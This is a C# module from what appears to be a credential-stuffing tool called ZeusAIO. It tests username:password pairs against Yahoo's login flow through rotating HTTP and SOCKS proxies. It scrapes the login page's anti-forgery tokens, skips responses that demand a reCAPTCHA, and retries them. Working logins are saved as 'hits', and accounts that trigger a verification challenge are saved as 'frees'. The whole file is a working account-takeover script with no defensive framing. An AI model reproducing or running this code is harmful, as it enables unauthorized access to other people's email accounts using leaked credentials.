using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Yahoo
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                        string Parse1 = httpRequest.Get("https://login.yahoo.com/").ToString();
                        string[] acrumb = Parse1.Split(new string[] { "name=\"acrumb\" value=\"" }, StringSplitOptions.None);
                        string[] sessionIndex = Parse1.Split(new string[] { "name=\"sessionIndex\" value=\"" }, StringSplitOptions.None);
                        string[] acrumb1 = acrumb[1].Split('"');
                        string[] sessionIndex1 = sessionIndex[1].Split('"');
                        httpRequest.ClearAllHeaders();
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                        httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                        httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                        httpRequest.AddHeader("bucket", "mbr-phoenix-gpst");
                        httpRequest.Referer = "https://login.yahoo.com/";
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://login.yahoo.com/", "acrumb=" + acrumb1[0] + "&sessionIndex=" + sessionIndex1[0] + "&username=" + s[0] + "&passwd=&signin=Next", "application/x-www-form-urlencoded").ToString();
                        {
                            if (text2.Contains("\"messages.ERROR_INVALID_USERNAME\""))
                            {
                                break;

                            }
                            else if (text2.Contains("\"location\""))
                            {
                                string location = Regex.Match(text2, "\"location\":\"(.*?)\"").Groups[1].Value;

                                if (location.Contains("recaptcha") || location == "")
                                    continue;

                                httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                                string Get_Req = httpRequest.Post($"https://login.yahoo.com{location}", new BytesContent(Encoding.Default.GetBytes($"crumb=czI9ivjtMSr&acrumb={acrumb1[0]}&sessionIndex=QQ--&displayName={s[0]}&passwordContext=normal&password={s[1]}&verifyPassword=Next"))).ToString();
                                if (Get_Req.Contains("primary_login_account-challenge-session-expired_"))
                                {
                                    ZeusAIO.mainmenu.errors++;
                                }
                                else
                                {
                                    if (Get_Req.Contains("Sign Out") || Get_Req.Contains("Manage Accounts") || Get_Req.Contains("https://login.yahoo.com/account/logout"))
                                    {
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - YAHOO] " + s[0] + ":" + s[1], Color.Green);
                                        }
                                        Export.AsResult("/Yahoo_hits", s[0] + ":" + s[1]);
                                        return false;

                                    }
                                    else if (Get_Req.Contains("Invalid password."))
                                    {
                                        break;

                                    }
                                    else if (Get_Req.Contains("For your safety, choose a method below to verify that") || Get_Req.Contains("Add a phone number and email"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - YAHOO] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Yahoo_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                    else
                                        {
                                            ZeusAIO.mainmenu.errors++;
                                            goto Retry;
                                        }
                                }
                            }

                        }
                        //break;
                    }
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }
    }
}
